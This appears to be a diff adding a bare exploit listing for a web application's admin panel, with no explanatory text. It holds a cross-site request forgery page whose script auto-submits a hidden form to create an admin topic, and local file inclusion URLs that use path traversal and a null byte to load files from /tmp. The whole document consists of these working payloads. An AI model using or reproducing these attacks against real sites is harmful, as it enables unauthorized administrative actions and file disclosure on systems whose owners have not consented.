@@ -1,0 +1,16 @@
+Cross-site request-forgery:
+
+<form action="http://www.example.com/admin/index.php?class=do&action=addTopic" method="post">
+<input type="hidden" name="name" value="New Topic Name here">
+<input type="hidden" name="sec" value="3">
+<input type="hidden" name="content" value="New Topic Content here">
+<input type="submit" id="btn">
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
+
+Local file include:
+
+http://www.example.com/index.php?class=../../../tmp/file%00
+http://www.example.com/admin/index.php?class=../../../tmp/file%00
